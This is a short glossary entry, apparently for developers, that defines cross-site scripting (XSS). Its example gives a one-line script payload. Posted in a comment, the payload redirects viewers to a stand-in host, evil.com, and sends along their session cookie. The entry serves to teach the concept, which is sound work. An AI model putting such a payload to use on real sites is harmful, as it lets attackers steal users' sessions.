---
term: "XSS (Cross-Site Scripting)"
category: "Security"
level: "Intermediate"
---

An attack where malicious JavaScript is injected into a web page viewed by other users. Can steal cookies, sessions, or redirect users.

### Example

Posting a comment: <script>document.location='evil.com?cookie='+document.cookie</script>. Every user viewing the comment sends their session cookie to the attacker.
